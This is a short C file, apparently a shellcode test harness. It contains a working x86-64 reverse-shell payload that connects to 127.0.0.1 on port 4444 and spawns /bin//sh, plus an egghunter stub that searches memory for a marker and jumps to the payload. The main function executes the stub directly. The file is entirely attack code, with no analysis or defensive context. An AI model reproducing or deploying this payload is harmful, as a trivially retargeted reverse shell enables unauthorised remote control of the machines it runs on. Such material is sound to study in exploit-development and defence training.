#include<stdio.h>
#include<string.h>

unsigned char shellcode[] = \
"\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc0\xb0\x29\x31\xff\x40\xb7\x02\x31\xf6\x40\xb6\x01\x31\xd2\x0f\x05\x89\xc7\x31\xc0\x50\xb0\x02\x50\xc6\x44\x24\x04\x7f\xc6\x44\x24\x07\x01\x66\xc7\x44\x24\x02\x11\x5c\x31\xc0\xb0\x2a\x48\x89\xe6\x31\xd2\xb2\x10\x0f\x05\x31\xc0\xb0\x21\x31\xf6\x0f\x05\x31\xc0\xb0\x21\x31\xf6\x40\xb6\x01\x0f\x05\x31\xc0\xb0\x21\x31\xf6\x40\xb6\x02\x0f\x05\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";


unsigned char code[] = \
"\x31\xf6\x48\x8d\x15\xe9\xd8\xff\xff\x66\x81\xca\xff\x0f\x48\xff\xc2\x48\x8d\x7a\x08\x6a\x15\x58\x0f\x05\x3c\xf2\x74\xeb\x49\xbc\x90\x50\x90\x50\x90\x50\x90\x50\x4c\x3b\x22\x75\xe1\xff\xe2";



main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
